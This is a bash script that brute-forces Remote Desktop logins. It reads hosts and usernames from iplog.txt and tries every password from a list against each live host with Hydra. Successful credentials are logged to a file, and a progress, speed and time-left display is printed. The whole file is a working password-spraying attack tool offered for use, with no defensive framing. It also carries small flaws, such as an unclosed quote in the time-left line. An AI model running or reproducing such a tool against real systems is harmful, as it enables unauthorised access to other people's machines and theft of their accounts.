#!/bin/bash

# Define input files
iplog_file="iplog.txt"
passwords_file="passwords.txt"
success_log_file="successful_logins.txt"
error_log_file="error_log_file.txt"

# Check if the input files exist
if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
    echo "One or both files do not exist, exiting."
    exit 1
fi

# Create or clear the log files
> "$success_log_file"
> "$error_log_file"

# Read all RDP entries into an array, filter out empty lines
mapfile -t iplog_entries < <(grep -v '^$' "$iplog_file")

# Initialize variables
total_passwords=$(wc -l < "$passwords_file")
current_attempt=0
successful_attempts=0
start_time=$(date +%s)

# Function to display progress
display_progress() {
    local elapsed_time=$1
    local current_attempt=$2
    local successful_attempts=$3
    local current_password=$4

    local percent=$(( (current_attempt * 100) / (total_passwords * ${#iplog_entries[@]})))
    local estimated_time_left=$(( (elapsed_time * (total_passwords * ${#iplog_entries[@]})) / current_attempt - elapsed_time ))

    # Calculate attempts per minute
    local attempts_per_minute=$(( current_attempt * 60 / elapsed_time ))

    tput clear
    echo "Total Attempts: $((total_passwords * ${#iplog_entries[@]}))"
    echo "Progress: $current_attempt / $((total_passwords * ${#iplog_entries[@]})) ($percent%)"
    echo "Currently checking password: '$current_password'"
    echo "Successful logins: $successful_attempts"
    echo "Time elapsed: $(date -u -d @$elapsed_time +%H:%M:%S)"
    echo "Current Speed: $attempts_per_minute attempts/minute"

    if (( current_attempt > 0 )); then
        echo "Estimated Time Left: $(printf '%02d:%02d:%02d' $((estimated_time_left/3600)) $(( (estimated_time_left%3600)/60 )) $((estimated_time_left%60)))
    fi
}

# Print initial UI
echo "Attempting logins..."

# Read passwords into an array, filter out empty lines
mapfile -t passwords < <(grep -v '^$' "$passwords_file")

# Loop through each password
for password in "${passwords[@]}"; do
    # Ensure the password is not empty
    if [[ -z "$password" ]]; then continue; fi

    # Check all hosts for the current password
    for entry in "${iplog_entries[@]}"; do
        IFS="://" read -r protocol full_url <<< "$entry"
        IFS=":" read -r rdp_ip target_name <<< "$full_url"

        # Check if the rdp_ip and target_name are not empty
        if [[ -z "$rdp_ip" || -z "$target_name" ]]; then continue; fi

        # Check if the host is alive (using ping)
        if ping -c 1 -W 1 "$rdp_ip" &> /dev/null; then
            # Run Hydra for each username and password pair, capturing output
            if sudo hydra -l "$target_name" -p "$password" "$rdp_ip" -t 5 -W 4 | grep -q "login successful"; then
                echo "Successful login with $target_name on $rdp_ip using password: $password" >> "$success_log_file"
                successful_attempts=$((successful_attempts + 1))
            else
                echo "Failed login attempt for $target_name on $rdp_ip using password: $password" >> "$error_log_file"
            fi
            
            # Update current attempt count
            current_attempt=$((current_attempt + 1))
            
            # Update elapsed time
            elapsed_time=$(( $(date +%s) - start_time ))

            # Display progress
            display_progress "$elapsed_time" "$current_attempt" "$successful_attempts" "$password"
        else
            echo "Host $rdp_ip is not reachable, skipping..." >> "$error_log_file"
        fi
    done

    # Remove the password from passwords.txt by creating a new file without the used password
    sed -i "1d" "$passwords_file"  # Delete the first line (the used password)
    # Re-read passwords into the array after modification
    mapfile -t passwords < <(grep -v '^$' "$passwords_file")
done

# Final output
elapsed_time=$(( $(date +%s) - start_time ))
echo "Completed processing all entries in $iplog_file."
echo "Successful Logins: $(wc -l < $success_log_file)"
echo "Time Used: $(date -u -d @$elapsed_time +%H:%M:%S)"
